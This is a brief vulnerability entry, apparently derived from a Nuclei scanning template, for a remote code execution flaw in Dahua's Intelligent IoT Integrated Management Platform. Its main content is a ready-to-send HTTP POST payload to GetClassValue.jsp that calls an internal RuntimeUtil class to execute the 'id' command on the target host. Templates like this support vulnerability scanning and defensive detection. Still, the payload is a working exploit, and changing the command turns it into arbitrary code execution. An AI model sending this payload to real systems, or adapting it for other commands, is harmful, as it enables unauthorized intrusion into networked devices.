# Vulnerability: Dahua 'GetClassValue' - Remote Code Execution
**Classification:** CWE-78,CWE-94,CWE-470
**Source:** Nuclei Template (`dahua-icc-getclassvalue-rce.yaml`)

## Description
Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "data": {
        "clazzName": "com.dahua.admin.util.RuntimeUtil",
        "methodName": "syncexecReturnInputStream",
        "fieldName": ["id"]
    }
}
```

